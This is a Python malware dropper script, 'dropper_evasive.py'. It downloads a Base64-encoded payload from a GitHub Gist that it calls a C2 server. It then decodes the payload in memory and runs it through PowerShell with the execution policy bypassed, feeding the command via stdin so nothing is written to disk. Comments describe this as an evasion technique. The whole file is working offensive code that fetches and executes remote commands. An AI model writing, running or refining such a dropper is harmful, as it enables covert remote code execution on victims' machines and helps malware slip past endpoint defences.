# dropper_evasive.py

import requests
import subprocess
import base64  # --- NEW ---: The library for decoding Base64.

# --- CONFIGURATION ---
# Paste the "Raw" URL for your NEW, Base64-encoded Gist here.
C2_URL = "https://gist.githubusercontent.com/nithiya-rajesh/5199a6d6caa9a7d6b501cc0f7a97117a/raw/c62ed6b954bbd866e5ee014ba3c4f1f54b08d190/payload.b64"

def get_obfuscated_payload():
    """Downloads the obfuscated payload from the C2 server."""
    try:
        print(f"[*] Downloading obfuscated payload from {C2_URL}...")
        response = requests.get(C2_URL)
        response.raise_for_status()
        
        # The content is the Base64 string. We strip any whitespace.
        return response.text.strip()
        
    except requests.exceptions.RequestException as e:
        print(f"[!] Error downloading payload: {e}")
        return None

def execute_payload_in_memory(encoded_payload):
    """Decodes and executes the payload directly in memory."""
    try:
        print("[*] Decoding payload in memory...")
        # --- CORE EVASION TECHNIQUE ---
        # 1. Decode the Base64 string back into its original bytes.
        decoded_bytes = base64.b64decode(encoded_payload)
        # 2. Decode the bytes into a UTF-8 string that PowerShell can understand.
        decoded_command = decoded_bytes.decode('utf-8')

        print("[*] Executing payload from memory...")
        
        # --- MODIFIED EXECUTION ---
        # Instead of using '-File', we use '-Command'.
        # We pass the decoded command directly to PowerShell via its standard input (stdin).
        # This avoids writing the command to a file on disk.
        result = subprocess.run(
            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", "-"],
            input=decoded_command, # Pass the command via stdin
            check=True,
            capture_output=True,
            text=True
        )
        
        print("[+] Payload executed successfully in memory.")
        
    except (base64.binascii.Error, UnicodeDecodeError) as e:
        print(f"[!] Error decoding payload: {e}")
    except subprocess.CalledProcessError as e:
        print(f"[!] Error executing payload: {e}")
        print(f"    Stderr: {e.stderr}")
    except FileNotFoundError:
        print("[!] Error: powershell.exe not found.")

def main():
    """Main orchestrator function."""
    encoded_payload = get_obfuscated_payload()
    if encoded_payload:
        execute_payload_in_memory(encoded_payload)

if __name__ == "__main__":
    main()
